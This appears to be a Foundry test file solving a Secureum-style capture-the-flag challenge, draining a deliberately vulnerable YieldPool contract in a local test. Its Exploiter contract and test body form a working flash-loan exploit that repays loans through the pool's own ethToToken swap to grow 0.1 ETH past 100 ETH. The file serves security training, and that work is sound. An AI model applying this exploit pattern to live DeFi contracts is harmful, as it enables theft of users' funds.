// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20, IERC3156FlashBorrower} from "../src/6_yieldPool/YieldPool.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
contract Exploiter is IERC3156FlashBorrower {
    YieldPool public yieldPool;
    IERC20 public secureumToken;

    constructor(address _yieldPool) payable {
        yieldPool = YieldPool(payable(_yieldPool));
        secureumToken = yieldPool.TOKEN();
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        yieldPool.ethToToken{value: amount + fee}();
        secureumToken.transfer(initiator, secureumToken.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // function withdraw() external {
    //     token.approve(address(yieldPool), token.balanceOf(address(this)));
    //     yieldPool.tokenToEth(token.balanceOf(address(this)));
    //     msg.sender.call{value: address(this).balance}("");
    // }

    receive() external payable {}
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/
        Exploiter exploiter = new Exploiter{value: 0.1 ether}(address(yieldPool));
        // loan 10 ETH and swap to token
        yieldPool.flashLoan(exploiter, yieldPool.ETH(), address(exploiter).balance * 100, "");
        // swap received token to ~10 ETH
        token.approve(address(yieldPool), token.balanceOf(attacker));
        yieldPool.tokenToEth(token.balanceOf(attacker));
        // loan ~1000 ETH and swap to token
        address(exploiter).call{value: attacker.balance}("");
        yieldPool.flashLoan(exploiter, yieldPool.ETH(), address(exploiter).balance * 100, "");
        // swap received token to ~1000 ETH
        token.approve(address(yieldPool), token.balanceOf(attacker));
        yieldPool.tokenToEth(token.balanceOf(attacker));

        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
